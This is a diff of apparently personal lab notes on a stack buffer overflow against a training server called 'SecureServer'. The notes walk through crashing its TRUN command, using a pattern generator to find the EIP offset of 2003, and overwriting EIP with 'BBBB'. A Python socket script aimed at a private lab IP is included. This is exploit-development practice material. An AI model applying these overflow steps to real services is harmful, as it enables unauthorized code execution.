@@ -841,15 +841,19 @@ Welcome to SecureServer! Enter HELP for help.
 UNKNOWN COMMAND
 ```
 - modify your script to have ```"HELP"``` as the value in the buf variable.
-- then change to "TRUN /.:/" & += "A" * 5000
-- script should now look like:
+- then go to (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and generate a 5000 character pattern
+- tokk that pattern and pasted that in the script under the ```buf = "TRUN /.:/"``` in a new variable ```buf += " 5k pattern"
+- we run the script and that gives us the EIP, we plug EIP in the website for the offset and that gives us the offset.
+- we replaced 5k pattern with the offset value, we also add ```"BBBB"``` to verify that it took.
+## Script now
 ```
 #!/usr/bin/env python
 
 import socket
 
 buf = "TRUN /.:/"
-buf += "A" * 5000
+buf += "A" * 2003
+buf += "BBBB"
 
 s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
 s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
